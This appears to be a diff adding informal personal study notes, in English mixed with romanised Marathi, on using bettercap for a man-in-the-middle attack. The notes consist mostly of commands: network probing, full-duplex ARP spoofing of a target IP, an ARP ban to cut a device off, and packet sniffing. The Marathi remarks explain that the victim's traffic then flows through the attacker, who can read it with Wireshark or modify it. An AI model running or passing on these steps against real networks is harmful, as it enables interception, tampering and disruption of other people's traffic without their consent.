@@ -1,0 +1,44 @@
+bettercap
+
+to run to tool
+
+bettercap -iface interface
+
+help module
+
+net.probe
+keeps sending packets in same network to discover the packets in same networks
+
+net.probe on
+
+net.recon is automatically on
+
+net.show to see all the connected clients
+ 
+
+parameter chya khalcha sagle option asta je ki aplya kade asata mahnun 
+tyanna kasa use karaycha 
+
+tr
+pahile 
+
+set arp.spoof.fullduplex true
+
+set arp.spoof.target **ip of target**
+
+ set arp.spoof on
+set arp.ban on
+ set arp.spoof on
+set arp.ban off
+
+
+NET.PROBE ANNI NET.RECON SHOULD BE RUNNING WHILE ARP SPOOFING IS WORKING
+
+
+ATA KAI HOTA A  ki sagle request anni response aplya madhunch flow hota ahettt..so aplya vr ahe ki kasa tyala modify karyacha ki nahi
+tr tya sathi apllya la wireshark chi garaj lagel tycchya data la enchode karynya sathi
+anni
+sadhya toh bettercap cha module vaparnar ahot apan
+
+net.sniff on
+
